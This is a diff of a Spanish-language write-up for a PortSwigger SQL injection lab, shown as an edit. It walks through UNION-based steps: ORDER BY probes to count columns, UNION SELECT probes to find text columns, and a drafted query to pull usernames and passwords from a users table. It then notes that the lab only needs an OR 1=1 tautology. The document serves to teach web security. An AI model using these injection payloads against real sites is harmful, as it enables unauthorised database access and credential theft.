@@ -71,26 +71,31 @@ HTTP/2 200 OK
 
 ## 🎯 Identificación del punto vulnerable
 
-El parámetro vulnerable es:
-
+El punto de entrada más probable es el parámetro:
 ```
 category
 ```
-
-Consulta backend estimada:
-
+En una aplicación de catálogo, la consulta que corre por detrás suele ser algo como (Consulta backend estimada): 
 ```sql
 SELECT name, description, price 
 FROM products 
 WHERE category = 'Corporate gifts' AND released = 1
 ```
 
+Para realizar una inyección de tipo UNION-based, tenemos que seguir la siguiente secuencia de pasos:
+
 ---
 
-## 🔍 Paso 1: Número de columnas (UNION-based)
-
+## 🔍 Paso 1: Determinar el número de columnas
+Modificamos el parámetro category usando ORDER BY. Tenemos que ir probando números hasta que la página de un error o cambie (el -- sirve para ignorar el resto de la consulta original).
 Probamos:
-
+```sql
+/filter?category=Corporate+gifts' ORDER BY 1-- 
+/filter?category=Corporate+gifts' ORDER BY 2-- 
+/filter?category=Corporate+gifts' ORDER BY 3-- 
+...
+```
+seguimos hasta que falle. Si falla en el 4, significa que hay 3 columnas
 ```
 ' ORDER BY 1--
 ' ORDER BY 2--
@@ -107,15 +112,25 @@ Resultados:
 
 ---
 
-## 🔍 Paso 2: Columnas que aceptan texto
+## 🔍 Paso 2: Verificar columnas que aceptan texto
 
-Probamos:
+Ahora necesitamos saber en cuál puedes mostrar las contraseñas (que son texto). Probamos inyectando un string 'a' en cada posición:
 
 ```http
 ' UNION SELECT 'a',NULL,NULL,NULL,NULL,NULL,NULL,NULL--
 ```
+```http
+Response: HTTP/2 500 Internal Server Error
+```
+```http
+' UNION SELECT NULL,'a',NULL,NULL,NULL,NULL,NULL,NULL--
+```
+```http
+Response: HTTP/2 200 OK
+ ...
+```
 
-Y variaciones moviendo `'a'`:
+Y así hacemos sucesivamente variaciones moviendo `'a'` por las 8 posiciones:
 
 Resultados:
 
@@ -129,9 +144,20 @@ Resultados:
 
 ![Imagen 2](imagenes/imagen2.png)
 
----
+Ahora sabemos que las columnas 2, 3, 6, 8 aceptan texto.
 
-## 🚀 Paso 3: Ataque final (Solución del lab)
+---
+## Paso 3: Extraer los datos (El ataque final): 
+Queremos sacar los usuarios y contraseñas de la tabla users. La URL final sería: 
+```http
+/filter?category=Gifts' UNION SELECT NULL, username, password,NULL,NULL,campo6,NULL,campo8 FROM users--
+```
+Pero no va a funcionar porque no sabemos a ciencia cierta que campos son.
+
+## 🚀 Paso 3 Real: Ataque final (Solución del lab)
+Pero en este punto nos damos cuenta que realmente el laboratorio es más sencillo:
+
+El Lab 1 de PortSwigger es un poco más sencillo que el ataque UNION que estabamos preparando. El objetivo no es robar la tabla de usuarios todavía, sino romper el filtro para ver productos ocultos. 
 
 ⚠️ Aquí está la clave: este lab **NO requiere UNION**.
 
@@ -140,6 +166,14 @@ Solo necesitamos romper la condición:
 ```sql
 released = 1
 ```
+Si la consulta original es: 
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+El programador quiere que solo veamos lo que tiene released = 1. 
+Para ver todo (lo publicado y lo oculto), necesitamos que la condición WHERE sea siempre verdadera. 
+La Consulta Final para el Lab 1 Para resolver este laboratorio específico, solo necesitas "anular" el resto de la consulta con un comentario y añadir una condición que siempre se cumpla (OR 1=1).
 
 ### 💥 Payload final:
 
